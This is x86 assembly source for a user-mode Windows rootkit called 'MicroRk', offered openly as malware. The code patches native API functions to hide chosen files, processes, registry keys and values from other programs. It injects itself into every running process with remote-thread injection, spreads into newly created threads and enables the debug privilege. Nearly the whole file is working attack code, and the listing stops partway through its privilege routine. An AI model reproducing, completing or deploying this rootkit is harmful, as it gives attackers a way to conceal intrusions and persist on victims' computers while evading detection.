; ---------------------------------------
;  MicroRk - Very small usermode rootkit
; ---------------------------------------

OP_NONE 	 equ 00h
OP_MODRM	 equ 01h
OP_DATA_I8	 equ 02h
OP_DATA_I16	 equ 04h
OP_DATA_I32	 equ 08h
OP_DATA_PRE66_67 equ 10h
OP_WORD 	 equ 20h
OP_REL32	 equ 40h

struct SET_DATA
   TrueProcesses   rw 100h
   HiddenFiles	   rw 100h
   HiddenProcesses rw 100h
   HiddenValues    rw 100h
   HiddenKeysCount dd ?
   HiddenKeysData  rw 100h
   HiddenKeysOff   rw 100h
ends

struct INJ_DATA
   InjSize			 dd ?
   pVirtualAllocEx		 dd ?
   pReadProcessMemory		 dd ?
   pWriteProcessMemory		 dd ?
   pCreateRemoteThread		 dd ?
   pVirtualProtect		 dd ?
   pWcsnicmp			 dd ?
   pWcsncpy			 dd ?
   pZwOpenKey			 dd ?
   pZwClose			 dd ?
   pRtlInitUnicodeString	 dd ?
   pMapViewOfFile		 dd ?
   pDuplicateHandle		 dd ?
   pGetModuleFileNameW		 dd ?
   pZwQueryDirectoryFile	 dd ?
   pTrueZwQueryDirectoryFile	 dd ?
   pZwQuerySystemInformation	 dd ?
   pTrueZwQuerySystemInformation dd ?
   pZwEnumerateValueKey 	 dd ?
   pTrueZwEnumerateValueKey	 dd ?
   pZwEnumerateKey		 dd ?
   pTrueZwEnumerateKey		 dd ?
   pZwCreateThread		 dd ?
   pTrueZwCreateThread		 dd ?
   pSetData			 dd ?
   hSetMapping			 dd ?
   OldEip			 dd ?
ends

pSetData dd ?
hMapping dd ?

InjectCode:
  InjData INJ_DATA ?

  push	  eax
  push	  ebx
  push	  ecx
  push	  edx
  push	  esi
  push	  edi
  push	  ebp
  call	  GetInjData
  mov	  esi, [edi + INJ_DATA.hSetMapping]
  push	  0
  push	  0
  push	  0
  push	  FILE_MAP_READ
  push	  esi
  call	  dword [edi + INJ_DATA.pMapViewOfFile]
  test	  eax, eax
  jz	  @F
  mov	  [edi + INJ_DATA.pSetData], eax
  call	  $+5
  pop	  eax
  sub	  eax, $-NewZwQueryDirectoryFile-1
  push	  eax
  push	  dword [edi + INJ_DATA.pZwQueryDirectoryFile]
  call	  HookCode
  mov	  [edi + INJ_DATA.pTrueZwQueryDirectoryFile], eax
  call	  $+5
  pop	  eax
  sub	  eax, $-NewZwQuerySystemInformation-1
  push	  eax
  push	  dword [edi + INJ_DATA.pZwQuerySystemInformation]
  call	  HookCode
  mov	  [edi + INJ_DATA.pTrueZwQuerySystemInformation], eax
  call	  $+5
  pop	  eax
  sub	  eax, $-NewZwEnumerateValueKey-1
  push	  eax
  push	  dword [edi + INJ_DATA.pZwEnumerateValueKey]
  call	  HookCode
  mov	  [edi + INJ_DATA.pTrueZwEnumerateValueKey], eax
  call	  $+5
  pop	  eax
  sub	  eax, $-NewZwEnumerateKey-1
  push	  eax
  push	  dword [edi + INJ_DATA.pZwEnumerateKey]
  call	  HookCode
  mov	  [edi + INJ_DATA.pTrueZwEnumerateKey], eax
  call	  $+5
  pop	  eax
  sub	  eax, $-NewZwCreateThread-1
  push	  eax
  push	  dword [edi + INJ_DATA.pZwCreateThread]
  call	  HookCode
  mov	  [edi + INJ_DATA.pTrueZwCreateThread], eax
@@:
  mov	  eax, [edi + INJ_DATA.OldEip]
  test	  eax, eax
  pop	  ebp
  pop	  edi
  pop	  esi
  pop	  edx
  pop	  ecx
  pop	  ebx
  xchg	  [esp], eax
  jnz	  @F
  pop	  eax
  retn	  0Ch
@@:
  ret

GetInjData:
  call	  $+5
  pop	  edi
  sub	  edi, $-InjData-1
  ret

Flags	  db 00h, 01h, 02h, 03h, 04h, 06h, 08h, 0Ah, 0Ch, 10h, 11h, 20h, 14h, 40h, 41h, 50h
prefixes: db 2Eh, 3Eh, 36h, 26h, 64h, 65h, 0F0h, 0F2h, 0F3h, 66h, 67h

OpcodeFlags:
db	011h, 011h, 029h, 000h, 011h, 011h, 029h, 000h, \
	011h, 011h, 029h, 000h, 011h, 011h, 029h, 000h, \
	011h, 011h, 029h, 000h, 011h, 011h, 029h, 000h, \
	011h, 011h, 029h, 000h, 011h, 011h, 029h, 000h, \
	000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, \
	000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, \
	000h, 011h, 000h, 000h, 09Ah, 023h, 000h, 000h, \
	022h, 022h, 022h, 022h, 022h, 022h, 022h, 022h, \
	03Ah, 033h, 011h, 011h, 011h, 011h, 011h, 011h, \
	000h, 000h, 000h, 000h, 000h, 0C0h, 000h, 000h, \
	099h, 099h, 000h, 000h, 029h, 000h, 000h, 000h, \
	022h, 022h, 022h, 022h, 099h, 099h, 099h, 099h, \
	033h, 040h, 011h, 03Ah, 050h, 040h, 002h, 000h, \
	011h, 011h, 022h, 000h, 011h, 011h, 011h, 011h, \
	022h, 022h, 022h, 022h, 0FFh, 0C2h, 000h, 000h, \
	000h, 000h, 000h, 011h, 000h, 000h, 000h, 01Eh, \
	011h, 011h, 000h, 000h, 000h, 000h, 001h, 003h, \
	011h, 011h, 011h, 011h, 010h, 000h, 000h, 000h, \
	011h, 011h, 010h, 010h, 011h, 011h, 011h, 011h, \
	000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, \
	011h, 011h, 011h, 011h, 011h, 011h, 011h, 011h, \
	011h, 011h, 011h, 011h, 011h, 011h, 011h, 011h, \
	011h, 011h, 011h, 011h, 011h, 011h, 000h, 011h, \
	003h, 033h, 011h, 010h, 000h, 000h, 011h, 011h, \
	0FFh, 0FFh, 0FFh, 0FFh, 0FFh, 0FFh, 0FFh, 0FFh, \
	011h, 011h, 011h, 011h, 011h, 011h, 011h, 011h, \
	000h, 001h, 031h, 000h, 000h, 001h, 031h, 011h, \
	011h, 011h, 011h, 011h, 000h, 031h, 011h, 011h, \
	011h, 031h, 033h, 031h, 000h, 000h, 000h, 000h, \
	011h, 011h, 011h, 011h, 011h, 011h, 011h, 011h, \
	011h, 011h, 011h, 011h, 011h, 011h, 011h, 011h, \
	011h, 011h, 011h, 011h, 011h, 011h, 011h, 010h

SizeOfOpcode:
  pushad
  mov	  esi, [esp + 24h]
  sub	  ebx, ebx
  sub	  eax, eax
  cdq
  mov	  bl, 66h
  cld
  push	  esi
.SkipPrefixes:
  sub	  ecx, ecx
  mov	  cl, 11
  call	  $+5
  pop	  edi
  sub	  edi, $-prefixes - 1
  lodsb
  repne scasb
  jnz	  .noP66_67
  sub	  al, bl
  jnz	  @F
  or	  dl, 1
@@:
  dec	  al
  jnz	  .SkipPrefixes
  or	  dl, 2
  jmp	  .SkipPrefixes
.noP66_67:
  dec	  esi
  push	  eax
  mov	  edi, eax
  lodsb
  pop	  ecx
  cmp	  al, 0Fh
  jnz	  @F
  lodsb
  mov	  ecx, eax
  inc	  ah
@@:
  shr	  eax, 1
  push	  edi
  call	  $+5
  pop	  edi
  sub	  edi, $-OpcodeFlags-1
  mov	  bl, [edi + eax]
  pop	  edi
  test	  cl, 1
  jnz	  @F
  shr	  bl, 4
  jmp	  .end_flag
@@:
  and	  bl, 0Fh
.end_flag:
  push	  edi
  call	  $+5
  pop	  edi
  sub	  edi, $-Flags-1
  mov	  bl, [edi + ebx]
  pop	  edi
  sub	  ecx, ecx
  mov	  cl, OP_WORD
  test	  cl, bl
  jz	  @F
  inc	  esi
@@:
  mov	  cl, OP_MODRM
  test	  cl, bl
  jz	  .imm
  lodsb
  mov	  ecx, eax
  and	  cl, 38h
  shr	  ecx, 3
  xchg	  ecx, edi
  test	  edi, edi
  jnz	  @F
  cmp	  cl, 0F6h
  jnz	  $ + 5
  or	  bl, OP_DATA_I8
  cmp	  cl, 0F7h
  jnz	  @F
  or	  bl, OP_DATA_PRE66_67
@@:
  push	  ebx
  sub	  ebx, ebx
  push	  eax
  pop	  edi
  shr	  edi, 6
  xchg	  eax, ebp
  and	  ebp, 7
  xchg	  eax, edi
  sub	  edi, edi
  test	  dl, 2
  jnz	  @F
  cmp	  ebp, 4
  jnz	  @F
  inc	  edi
@@:
  push	  edi
  xchg	  eax, edi
  push	  edi
  test	  edi, edi
  jnz	  @F
  test	  dl, 2
  jz	  .x01
  cmp	  ebp, 6
  jnz	  .x01
  mov	  bl, 2
.x01:
  test	  dl, 2
  jnz	  @F
  cmp	  ebp, 5
  jnz	  @F
  mov	  bl, 4
@@:
  dec	  edi
  jnz	  @F
  inc	  ebx
@@:
  dec	  edi
  jnz	  @F
  mov	  bl, 4
  test	  dl, 2
  jz	  @F
  dec	  ebx
  dec	  ebx
@@:
  pop	  eax
  pop	  ecx
  dec	  edi
  jnz	  @F
  sub	  ecx, ecx
@@:
  xchg	  eax, edi
  jecxz   @F
  lodsb
  and	  al, 7
  cmp	  al, 5
  jnz	  @F
  bt	  edi, 0
  jc	  @F
  mov	  bl, 4
@@:
  add	  esi, ebx
  pop	  ebx
.imm:
  mov	  cl, OP_DATA_I8
  test	  cl, bl
  jz	  @F
  inc	  esi
@@:
  mov	  cl, OP_DATA_I16
  test	  cl, bl
  jz	  @F
  inc	  esi
  inc	  esi
@@:
  mov	  cl, OP_DATA_I32
  test	  cl, bl
  jz	  @F
  add	  esi, 4
@@:
  xchg	  eax, edi
  sub	  ebp, ebp
  inc	  ebp
  inc	  ebp
  cmp	  al, 0A0h
  jb	  @F
  cmp	  al, 0A3h
  ja	  @F
  inc	  ebp
  inc	  ebp
  bt	  edx, 1
  jnc	  .pref
  dec	  ebp
  dec	  ebp
  jmp	  .pref
@@:
  bt	  edx, 0
  jc	  .pref
  inc	  ebp
  inc	  ebp
.pref:
  mov	  cl, OP_DATA_PRE66_67
  test	  cl, bl
  jz	  @F
  add	  esi, ebp
@@:
  pop	  edi
  sub	  esi, edi
  stc
  cmp	  esi, 15
  ja	  @F
  mov	  [esp + 1Ch], esi
  cmc
@@:
  popad
  retn	  4

HookCode:  ; fnAddr, NewAddr
  pushad
  mov	  esi, [esp + 24h]
  push	  PAGE_EXECUTE_READWRITE
  push	  MEM_COMMIT + MEM_RESERVE
  push	  20
  push	  0
  push	  -1
  call	  dword [edi + INJ_DATA.pVirtualAllocEx]
  test	  eax, eax
  jz	  @F
  mov	  edx, esi
  sub	  edx, eax
  sub	  edx, 5
  push	  eax
  push	  edi
  mov	  edi, eax
  lea	  ebx, [eax + 5]
hCopy:
  push	  esi
  call	  SizeOfOpcode
  jc	  @F
  mov	  ecx, eax
  rep movsb
  cmp	  edi, ebx
  jna	  hCopy
  mov	  byte	[edi], 0E9h
  mov	  dword [edi + 1], edx
  pop	  edi
  pop	  esi ; esi - NewFunction
  mov	  ebx, [esp + 24h]
  mov	  ecx, [esp + 28h]
  sub	  ecx, ebx
  sub	  ecx, 5
  push	  ebp
  mov	  ebp, esp
  sub	  esp, 4
  push	  ecx
  push	  ebx
  lea	  eax, [ebp - 4]
  push	  eax
  push	  PAGE_EXECUTE_READWRITE
  push	  5
  push	  ebx
  call	  dword [edi + INJ_DATA.pVirtualProtect]
  pop	  ebx
  pop	  ecx
  mov	  byte [ebx], 0E9h
  mov	  dword [ebx + 1], ecx
  leave
  mov	  [esp + 1Ch], esi
@@:
  popad
  retn	  8

IsMaskEquate: ; Mask, String, Length: PWCHAR
  push	  edx
  push	  esi
  mov	  esi, [esp+0Ch]
  push	  ebp
  jmp	  cnLoop
eLoop:
  xor	  eax, eax
  mov	  ax, [esi]
  xor	  ebp, ebp
  test	  ax, ax
  jz	  eCmp
@@:
  cmp	  ax, ';'
  jz	  @F
  inc	  ebp
  mov	  ax, [esi+ebp*2]
  test	  ax, ax
  jnz	  @B
@@:
  cmp	  [esp+18h], ebp
  jb	  @F
eCmp:
  push	  ebp
  push	  esi
  push	  dword [esp+1Ch]
  call	  dword [edi + INJ_DATA.pWcsnicmp]
  add	  esp, 0Ch
  test	  eax, eax
  jz	  eTrue
@@:
  lea	  esi, [esi+ebp*2+2]
cnLoop:
  cmp	  word [esi], 0
  jnz	  eLoop
  xor	  al, al
@@:
  pop	  ebp
  pop	  esi
  pop	  edx
  retn	  0Ch
eTrue:
  mov	  al, 1
  jmp	  @B

NewZwQueryDirectoryFile:
  push	  ebp
  mov	  ebp, esp
  push	  edi
  call	  GetInjData
  push	  dword [ebp+30h]
  push	  dword [ebp+2Ch]
  push	  dword [ebp+28h]
  push	  dword [ebp+24h]
  push	  dword [ebp+20h]
  push	  dword [ebp+1Ch]
  push	  dword [ebp+18h]
  push	  dword [ebp+14h]
  push	  dword [ebp+10h]
  push	  dword [ebp+0Ch]
  push	  dword [ebp+8]
  call	  dword [edi + INJ_DATA.pTrueZwQueryDirectoryFile]
  test	  eax, eax
  mov	  [ebp+30h], eax
  jl	  zExit
  cmp	  byte [ebp+28h], 0
  jnz	  zExit
  cmp	  dword [ebp+24h], 3
  jnz	  zExit
  call	  IsTrueProcess
  test	  al, al
  jnz	  zExit
  push	  ebx
  mov	  ebx, [ebp+28h]
  push	  esi
  push	  edx
  xor	  edx, edx
zfLoop:
  mov	  eax, [ebp+1Ch]
  lea	  esi, [edx+eax]
  mov	  eax, [esi+3Ch]
  add	  edx, [esi]
  shr	  eax, 1
  push	  eax
  lea	  eax, [esi+5Eh]
  push	  eax
  mov	  eax, [edi + INJ_DATA.pSetData]
  lea	  eax, [eax + SET_DATA.HiddenFiles]
  push	  eax
  call	  IsMaskEquate
  test	  al, al
  jz	  zNotHidden
  mov	  eax, [esi]
  test	  eax, eax
  jz	  zNotNextEntry
  test	  ebx, ebx
  jz	  @F
  add	  [ebx], eax
  jmp	  @F
zNotHidden:
  mov	  ebx, esi
@@:
  cmp	  dword [esi], 0
  jnz	  zfLoop
  jmp	  @F
zNotNextEntry:
  test	  ebx, ebx
  jz	  zNoMoreFiles
  and	  dword [ebx], 0
  jmp	  @F
zNoMoreFiles:
  mov	  dword [ebp+30h], 080000006h
@@:
  pop	  edx
  pop	  esi
  pop	  ebx
zExit:
  mov	  eax, [ebp+30h]
  pop	  edi
  pop	  ebp
  retn	  2Ch

NewZwQuerySystemInformation:
  push	  ebp
  mov	  ebp, esp
  push	  edi
  call	  GetInjData
  push	  ebx
  push	  esi
  push	  dword [ebp+14h]
  mov	  esi, [ebp+0Ch]
  push	  dword [ebp+10h]
  push	  esi
  push	  dword [ebp+8]
  call	  dword [edi + INJ_DATA.pTrueZwQuerySystemInformation]
  mov	  ebx, eax
  test	  ebx, ebx
  jl	  pExit
  cmp	  dword [ebp+8], 5
  jnz	  pExit
  call	  IsTrueProcess
  test	  al, al
  jnz	  pExit
  push	  edx
  xor	  edx, edx
pLoop:
  add	  esi, [esi]
  movzx   eax, word [esi+38h]
  push	  eax
  push	  dword [esi+3Ch]
  mov	  eax, [edi + INJ_DATA.pSetData]
  lea	  eax, [eax + SET_DATA.HiddenProcesses]
  push	  eax
  call	  IsMaskEquate
  test	  al, al
  jz	  pNoHidden
  test	  edx, edx
  jz	  pNoHidden
  mov	  eax, [esi]
  test	  eax, eax
  jz	  @F
  add	  [edx], eax
  jmp	  pNoHidden
@@:
  and	  dword [edx], 0
pNoHidden:
  cmp	  dword [esi], 0
  mov	  edx, esi
  jnz	  pLoop
  pop	  edx
pExit:
  pop	  esi
  mov	  eax, ebx
  pop	  ebx
  pop	  edi
  pop	  ebp
  retn	  10h

GetValueShift: ;KeyHandle, Index, Buff, BuffLength, ResultLength, NewIndex
  push	  ebp
  mov	  ebp, esp
  push	  ecx
  push	  ecx
  push	  ebx
  mov	  ebx, [ebp+10h]
  push	  esi
  push	  dword [ebp+18h]
  xor	  eax, eax
  push	  dword [ebp+14h]
  mov	  [ebp-4], eax
  push	  ebx
  push	  eax
  mov	  [ebp-8], eax
  push	  eax
  jmp	  @F
vLoop:
  push	  dword [ebx+8]
  lea	  eax, [ebx+0Ch]
  push	  eax
  mov	  eax, [edi + INJ_DATA.pSetData]
  lea	  eax, [eax + SET_DATA.HiddenValues]
  push	  eax
  call	  IsMaskEquate
  test	  al, al
  jnz	  vHidden
  inc	  dword [ebp-8]
vHidden:
  mov	  eax, [ebp-8]
  cmp	  eax, [ebp+0Ch]
  ja	  vExit
  push	  dword [ebp+18h]
  inc	  dword [ebp-4]
  push	  dword [ebp+14h]
  push	  ebx
  push	  0
  push	  dword [ebp-4]
@@:
  push	  dword [ebp+8]
  call	  dword [edi + INJ_DATA.pTrueZwEnumerateValueKey]
  mov	  esi, eax
  test	  esi, esi
  jge	  vLoop
vExit:
  mov	  eax, [ebp+1Ch]
  mov	  ecx, [ebp-4]
  mov	  [eax], ecx
  mov	  eax, esi
  pop	  esi
  pop	  ebx
  leave
  retn	  18h

NewZwEnumerateValueKey:
  push	  ebp
  mov	  ebp, esp
  push	  edi
  call	  GetInjData
  call	  IsTrueProcess
  test	  al, al
  jnz	  @F
  mov	  eax, [ebp+0Ch]
  lea	  ecx, [ebp+0Ch]
  push	  ecx
  push	  dword [ebp+1Ch]
  mov	  [ebp+0Ch], eax
  push	  dword [ebp+18h]
  push	  dword [ebp+14h]
  push	  eax
  push	  dword [ebp+8]
  call	  GetValueShift
  test	  eax, eax
  jl	  vlExit
@@:
  push	  dword [ebp+1Ch]
  push	  dword [ebp+18h]
  push	  dword [ebp+14h]
  push	  dword [ebp+10h]
  push	  dword [ebp+0Ch]
  push	  dword [ebp+8]
  call	  dword [edi + INJ_DATA.pTrueZwEnumerateValueKey]
vlExit:
  pop	  edi
  pop	  ebp
  retn	  18h

IsKeyHidden:  ;KeyName, NameLength
  push	  esi
  xor	  esi, esi
  mov	  eax, [edi + INJ_DATA.pSetData]
  cmp	  [eax + SET_DATA.HiddenKeysCount], esi
  push	  ebp
  jbe	  kNotf
  mov	  ebp, [esp+10h]
  shr	  ebp, 1
@@:
  mov	  eax, [edi + INJ_DATA.pSetData]
  lea	  eax, [eax + SET_DATA.HiddenKeysOff+2]
  movzx   eax, word [eax+esi*2]
  add	  eax, [edi + INJ_DATA.pSetData]
  add	  eax, SET_DATA.HiddenKeysData
  push	  ebp
  push	  eax
  push	  dword [esp+14h]
  call	  dword [edi + INJ_DATA.pWcsnicmp]
  add	  esp, 0Ch
  test	  eax, eax
  jz	  kHidden
  inc	  esi
  mov	  eax, [edi + INJ_DATA.pSetData]
  cmp	  esi, [eax + SET_DATA.HiddenKeysCount]
  jb	  @B
kNotf:
  xor	  al, al
@@:
  pop	  ebp
  pop	  esi
  retn	  8
kHidden:
  mov	  al, 1
  jmp	  @B

GetKeyShift:
  push	  ebp
  mov	  ebp, esp
  sub	  esp, 6Ch
  mov	  eax, [ebp+0Ch]
  push	  ebx
  push	  esi
  push	  dword [ebp+18h]
  mov	  esi, [ebp+10h]
  push	  dword [ebp+14h]
  xor	  ebx, ebx
  push	  esi
  push	  ebx
  push	  eax
  push	  dword [ebp+8]
  mov	  [ebp-4], eax
  call	  dword [edi + INJ_DATA.pTrueZwEnumerateKey]
  test	  eax, eax
  mov	  [ebp-8], eax
  jl	  gkExit
  mov	  eax, [edi + INJ_DATA.pSetData]
  cmp	  [eax + SET_DATA.HiddenKeysCount], ebx
  jbe	  gkNotKeys
@@:
  mov	  eax, [edi + INJ_DATA.pSetData]
  lea	  eax, [eax + SET_DATA.HiddenKeysOff+2]
  movzx   eax, word [eax+ebx*2]
  push	  dword [esi+0Ch]
  add	  eax, [edi + INJ_DATA.pSetData]
  add	  eax, SET_DATA.HiddenKeysData
  push	  eax
  lea	  eax, [esi+10h]
  push	  eax
  call	  dword [edi + INJ_DATA.pWcsnicmp]
  add	  esp, 0Ch
  test	  eax, eax
  jl	  gkNotKeys
  inc	  ebx
  mov	  eax, [edi + INJ_DATA.pSetData]
  cmp	  ebx, [eax + SET_DATA.HiddenKeysCount]
  jb	  @B
gkNotKeys:
  xor	  esi, esi
  test	  ebx, ebx
  jbe	  gkExit
gkLoop:
  mov	  eax, [edi + INJ_DATA.pSetData]
  lea	  eax, [eax + SET_DATA.HiddenKeysOff+2]
  movzx   eax, word [eax+esi*2]
  add	  eax, [edi + INJ_DATA.pSetData]
  add	  eax, SET_DATA.HiddenKeysData
  push	  20h
  push	  eax
  lea	  eax, [ebp-6Ch]
  push	  eax
  call	  dword [edi + INJ_DATA.pWcsncpy]
  add	  esp, 0Ch
  lea	  eax, [ebp-6Ch]
  push	  eax
  lea	  eax, [ebp-14h]
  push	  eax
  call	  dword [edi + INJ_DATA.pRtlInitUnicodeString]
  mov	  eax, [ebp+8]
  and	  dword [ebp-1Ch], 0
  and	  dword [ebp-18h], 0
  mov	  [ebp-28h], eax
  lea	  eax, [ebp-14h]
  mov	  [ebp-24h], eax
  lea	  eax, [ebp-2Ch]
  push	  eax
  push	  8
  lea	  eax, [ebp-0Ch]
  push	  eax
  mov	  dword [ebp-2Ch], 18h
  mov	  dword [ebp-20h], 40h
  call	  dword [edi + INJ_DATA.pZwOpenKey]
  test	  eax, eax
  jl	  @F
  push	  dword [ebp-0Ch]
  inc	  dword [ebp-4]
  call	  dword [edi + INJ_DATA.pZwClose]
@@:
  inc	  esi
  cmp	  esi, ebx
  jb	  gkLoop
  mov	  esi, [ebp+0Ch]
  cmp	  [ebp-4], esi
  jbe	  gkExit
  jmp	  gkNhdn
sCheck:
  push	  dword [ebp+18h]
  mov	  ebx, [ebp+10h]
  push	  dword [ebp+14h]
  push	  ebx
  push	  0
  push	  esi
  push	  dword [ebp+8]
  call	  dword [edi + INJ_DATA.pTrueZwEnumerateKey]
  test	  eax, eax
  mov	  [ebp-8], eax
  jl	  @F
  push	  dword [ebx+0Ch]
  add	  ebx, 10h
  push	  ebx
  call	  IsKeyHidden
  test	  al, al
  jz	  gkNhdn
  inc	  dword [ebp-4]
gkNhdn:
  inc	  esi
  cmp	  esi, [ebp-4]
  jbe	  sCheck
@@:
  dec	  esi
  mov	  [ebp-4], esi
gkExit:
  mov	  eax, [ebp+1Ch]
  mov	  ecx, [ebp-4]
  pop	  esi
  mov	  [eax], ecx
  mov	  eax, [ebp-8]
  pop	  ebx
  leave
  retn	  18h

NewZwEnumerateKey:
  push	  ebp
  mov	  ebp, esp
  push	  edi
  call	  GetInjData
  mov	  eax, [edi + INJ_DATA.pSetData]
  cmp	  dword [eax + SET_DATA.HiddenKeysCount], 0
  mov	  eax, [ebp+0Ch]
  mov	  [ebp+0Ch], eax
  jz	  kNotHide
  push	  eax
  call	  IsTrueProcess
  test	  al, al
  pop	  eax
  jnz	  kNotHide
  lea	  ecx, [ebp+0Ch]
  push	  ecx
  push	  dword [ebp+1Ch]
  push	  dword [ebp+18h]
  push	  dword [ebp+14h]
  push	  eax
  push	  dword [ebp+8]
  call	  GetKeyShift
  test	  eax, eax
  jl	  @F
kNotHide:
  push	  dword [ebp+1Ch]
  push	  dword [ebp+18h]
  push	  dword [ebp+14h]
  push	  dword [ebp+10h]
  push	  dword [ebp+0Ch]
  push	  dword [ebp+8]
  call	  dword [edi + INJ_DATA.pTrueZwEnumerateKey]
@@:
  pop	  edi
  pop	  ebp
  retn	  18h

IsProcessInfected: ; hProcess
  mov	  eax, [esp + 4]
  push	  ebp
  mov	  ebp, esp
  sub	  esp, 4
  push	  ebx
  push	  0
  push	  4
  lea	  ebx, [ebp-4]
  push	  ebx
  push	  [edi + INJ_DATA.pZwQueryDirectoryFile]
  push	  eax
  call	  dword [edi + INJ_DATA.pReadProcessMemory]
  test	  eax, eax
  jz	  @F
  xor	  eax, eax
  cmp	  byte [ebp-4], 0E9h
  setz	  al
@@:
  pop	  ebx
  leave
  retn	  4

NewZwCreateThread:
  push	  ebp
  mov	  ebp, esp
  sub	  esp, 8
  push	  edi
  call	  GetInjData
  cmp	  dword [ebp+14h], -1
  push	  esi
  mov	  esi, [ebp+1Ch]
  jz	  @F
  push	  dword [ebp+14h]
  call	  IsProcessInfected
  test	  al, al
  jnz	  @F
  push	  PAGE_EXECUTE_READWRITE
  push	  MEM_COMMIT + MEM_RESERVE
  push	  dword [edi + INJ_DATA.InjSize]
  push	  0
  push	  dword [ebp+14h]
  call	  dword [edi + INJ_DATA.pVirtualAllocEx]
  test	  eax, eax
  jz	  @F
  push	  eax
  push	  eax
  push	  0
  push	  dword [edi + INJ_DATA.InjSize]
  push	  edi
  push	  eax
  push	  dword [ebp+14h]
  call	  dword [edi + INJ_DATA.pWriteProcessMemory]
  mov	  eax, [esi+0B8h]
  mov	  [ebp-4], eax
  push	  DUPLICATE_SAME_ACCESS
  push	  0
  push	  0
  lea	  eax, [ebp-8]
  push	  eax
  push	  dword [ebp+14h]
  push	  dword [edi + INJ_DATA.hSetMapping]
  push	 -1
  call	  dword [edi + INJ_DATA.pDuplicateHandle]
  pop	  eax
  push	  0
  push	  8
  push	  ebp
  sub	  dword [esp], 8
  lea	  eax, [eax + INJ_DATA.hSetMapping]
  push	  eax
  push	  dword [ebp+14h]
  call	  dword [edi + INJ_DATA.pWriteProcessMemory]
  pop	  eax
  add	  eax, sizeof.INJ_DATA
  mov	  dword [esi+0B8h], eax
@@:
  push	  dword [ebp+24h]
  push	  dword [ebp+20h]
  push	  esi
  push	  dword [ebp+18h]
  push	  dword [ebp+14h]
  push	  dword [ebp+10h]
  push	  dword [ebp+0Ch]
  push	  dword [ebp+8]
  call	  [edi + INJ_DATA.pTrueZwCreateThread]
  pop	  esi
  pop	  edi
  leave
  retn	  20h

IsTrueProcess:
  push	  ebp
  mov	  ebp, esp
  sub	  esp, 100h
  push	  esi
  push	  ebx
  push	  edx
  lea	  esi, [ebp-100h]
  push	  edi
  mov	  edi, esi
  mov	  ecx, 100h / 4
  xor	  eax, eax
  rep stosd
  pop	  edi
  push	  100h
  push	  esi
  push	  0
  call	  [edi + INJ_DATA.pGetModuleFileNameW]
  mov	  esi, ebp
@@:
  dec	  esi
  cmp	  word [esi-2], '\'
  jnz	  @B
  push	 -1
  push	  esi
  mov	  eax, [edi + INJ_DATA.pSetData]
  lea	  eax, [eax + SET_DATA.TrueProcesses]
  push	  eax
  call	  IsMaskEquate
  pop	  edx
  pop	  ebx
  pop	  esi
  leave
  ret
InjectSize EQU $-InjectCode

ProcessHiddenKeys: ; edi - SET_DATA
  pushad
  lea	   esi, [edi + SET_DATA.HiddenKeysData]
  lea	   edx, [edi + SET_DATA.HiddenKeysOff + 2]
  xor	   ecx, ecx
  mov	   ebx, esi
@@:
  lodsw
  cmp	   ax, ';'
  jz	   dFound
  test	   ax, ax
  jnz	   @B
  jmp	   @F
dFound:
  inc	   ecx
  mov	   word [esi-2], 0
  mov	   ebp, esi
  sub	   ebp, ebx
  mov	   word [edx+ecx*2-2], bp
  jmp	   @B
@@:
  mov	   [edi + SET_DATA.HiddenKeysCount], ecx
pSort:
  xor	   esi, esi
  xor	   edx, edx
@@:
  inc	   edx
  push	   ebx
  push	   edx
  push	   ecx
  lea	   eax, [edi + SET_DATA.HiddenKeysOff]
  movzx    eax, word [eax + edx*2]
  add	   eax, ebx
  push	   eax
  lea	   eax, [edi + SET_DATA.HiddenKeysOff]
  movzx    eax, word [eax + edx*2-2]
  add	   eax, ebx
  push	   eax
  call	   [wcsicmp]
  add	   esp, 8
  pop	   ecx
  pop	   edx
  pop	   ebx
  test	   eax, eax
  jle	   pNoChange
  inc	   esi
  push	   ebx
  lea	   eax, [edi + SET_DATA.HiddenKeysOff]
  mov	   bx, [eax + edx*2]
  xchg	   [eax + edx*2-2], bx
  mov	   [eax + edx*2], bx
  pop	   ebx
pNoChange:
  cmp	   edx, ecx
  jnz	   @B
  test	   esi, esi
  jnz	   pSort
  popad
  ret

InfectProcess: ; hProcess
  push	  ebp
  mov	  ebp, esp
  push	  esi
  push	  edi
  mov	  edi, InjData
  push	  dword [ebp + 8]
  call	  IsProcessInfected
  test	  eax, eax
  jnz	  @F
  push	  PAGE_EXECUTE_READWRITE
  push	  MEM_COMMIT + MEM_RESERVE
  push	  InjectSize
  push	  0
  push	  dword [ebp + 8]
  call	  [VirtualAllocEx]
  test	  eax, eax
  jz	  @F
  mov	  esi, eax
  push	  DUPLICATE_SAME_ACCESS
  push	  0
  push	  0
  lea	  eax, [InjData.hSetMapping]
  push	  eax
  push	  dword [ebp + 8]
  push	  [hMapping]
  push	 -1
  call	  [DuplicateHandle]
  push	  0
  push	  InjectSize
  push	  InjectCode
  push	  esi
  push	  dword [ebp + 8]
  call	  [WriteProcessMemory]
  push	  0
  push	  0
  push	  0
  add	  esi, sizeof.INJ_DATA
  push	  esi
  push	  0
  push	  0
  push	  dword [ebp + 8]
  call	  [CreateRemoteThread]
@@:
  pop	  edi
  pop	  esi
  pop	  ebp
  ret

InjectToAll:
  push	   ebp
  mov	   ebp, esp
  sub	   esp, 128h
  push	   0
  push	   2
  call	   [CreateToolhelp32Snapshot]
  test	   eax, eax
  jz	   iExit
  mov	   esi, eax
  lea	   edi, [ebp-128h]
  mov	   dword [edi], 128h
  push	   edi
  push	   esi
  call	   [Process32First]
@@:
  test	   eax, eax
  jz	   @F
  mov	   eax, [edi+08h]
  push	   eax
  push	   0
  push	   PROCESS_ALL_ACCESS
  call	   [OpenProcess]
  test	   eax, eax
  jz	   pNext
  push	   eax
  push	   eax
  call	   InfectProcess
  call	   [CloseHandle]
pNext:
  push	   edi
  push	   esi
  call	   [Process32Next]
  jmp	   @B
@@:
  push	   esi
  call	   [CloseHandle]
iExit:
  leave
  ret

EnableDebugPrivilege:
  push	   0
  push	   'lege'
  push	   'rivi'
  push	   'bugP'
  push	   'SeDe'
  mov	   ebp, esp
  sub	   esp, 24h
  push	   ebp
  push	   esp
  push	   28h
  push	  -1
  call	   [OpenProcessToken]
  test	   eax, eax
  jz	   @F
  lea	   eax, [esp + 8]
  push	   eax
  push	   ebp
  push	   0
  call	   [LookupPrivilegeValue]
  test	   eax, eax
  jz	   @F
  mov	   dword [esp + 14h], 1
  mov	   eax, [esp + 8]
  mov	   [esp + 18h], eax
